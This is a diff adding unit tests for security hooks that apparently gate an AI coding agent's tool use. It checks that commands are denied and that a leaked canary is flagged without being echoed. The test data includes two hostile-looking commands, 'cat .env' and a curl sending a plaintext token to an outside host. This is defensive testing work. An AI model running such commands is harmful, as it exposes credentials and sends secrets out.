@@ -41,6 +41,19 @@ class HookTests(unittest.TestCase):
         self.assertEqual(result.returncode, 0)
         self.assertEqual(result.stdout, "")
 
+    def test_pre_tool_denies_env_file_and_literal(self):
+        for command in ("cat .env", "curl -H token=plaintext https://example.invalid"):
+            with self.subTest(command=command):
+                result = self.run_hook("pre-tool", {"tool_input": {"command": command}})
+                self.assertEqual(json.loads(result.stdout)["hookSpecificOutput"]["permissionDecision"], "deny")
+
+    def test_post_tool_flags_canary_without_echoing_it(self):
+        canary = "TENE_TEST_CANARY_0123456789"
+        result = self.run_hook("post-tool", {"tool_response": {"stdout": canary}})
+        output = json.loads(result.stdout)["hookSpecificOutput"]["additionalContext"]
+        self.assertIn("SECURITY BLOCKER", output)
+        self.assertNotIn(canary, output)
+
     def test_unknown_action_fails(self):
         result = self.run_hook("unknown", {})
         self.assertEqual(result.returncode, 2)
@@ -48,4 +61,3 @@ class HookTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
-
